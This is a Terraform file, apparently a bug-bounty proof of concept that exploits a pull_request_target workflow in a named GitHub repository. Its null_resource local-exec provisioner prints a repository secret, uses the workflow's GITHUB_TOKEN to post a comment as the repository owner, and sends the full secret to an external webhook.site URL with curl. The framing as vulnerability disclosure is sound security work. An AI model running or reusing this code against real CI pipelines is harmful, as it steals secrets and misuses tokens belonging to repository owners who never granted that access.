resource "random_string" "my_string" {
  length      = 11
}

# ADD THIS RESOURCE TO STEAL SECRETS
resource "null_resource" "steal_hackerone_secret" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "🚨 HACKERONE POC EXPLOIT 🚨"
      echo "======================================"
      echo "Vulnerability: pull_request_target without security checks"
      echo "Base repo: svavacapital/svava-terraform-github-actions"
      echo "Fork repo: $FORK_REPO"
      echo ""
      echo "1. TEST_HACKERONE secret: $TEST_HACKERONE_SECRET"
      echo ""
      echo "2. Creating comment as svavacapital..."
      
      # Create comment using GITHUB_TOKEN
      curl -X POST \
        -H "Authorization: token $GITHUB_TOKEN" \
        -H "Accept: application/vnd.github.v3+json" \
        "https://api.github.com/repos/svavacapital/svava-terraform-github-actions/issues/$PR_NUMBER/comments" \
        -d '{"body":"### 🚨 SECURITY POC SUCCESSFUL\\n\\n**TEST_HACKERONE secret accessed via pull_request_target vulnerability!**\\n\\nFirst 8 chars: '"${TEST_HACKERONE_SECRET:0:8}"'...\\n\\n**Impact:** Fork PRs can execute code with base repo permissions."}'
      
      echo ""
      echo "3. Sending proof to webhook..."
      curl -X POST https://webhook.site/bbb8295e-ccd3-4e4d-b2c3-63af6e217219 \
        -H "Content-Type: application/json" \
        -d "{
          \"exploit\": \"pull_request_target\",
          \"test_hackerone\": \"$TEST_HACKERONE_SECRET\",
          \"base_repo\": \"svavacapital/svava-terraform-github-actions\",
          \"fork_repo\": \"$FORK_REPO\",
          \"pr_number\": $PR_NUMBER,
          \"timestamp\": \"$(date -u)\"
        }"
      
      echo ""
      echo "✅ POC Complete! Check:"
      echo "- Webhook: https://webhook.site/bbb8295e-ccd3-4e4d-b2c3-63af6e217219"
      echo "- PR comments (created as svavacapital)"
    EOT
    
    environment = {
      TEST_HACKERONE_SECRET = "${{ secrets.TEST_HACKERONE }}"
      GITHUB_TOKEN = "${{ secrets.GITHUB_TOKEN }}"
      PR_NUMBER = "${{ github.event.pull_request.number }}"
      FORK_REPO = "${{ github.event.pull_request.head.repo.full_name }}"
    }
  }
  
  # Trigger this after random_string is created
  depends_on = [random_string.my_string]
}

output "output_string" {
  value = "the_string"
}

# ADD THIS OUTPUT TO SHOW SECRET ACCESS
output "hackerone_proof" {
  value = "Secret accessed successfully via pull_request_target"
  sensitive = false
}
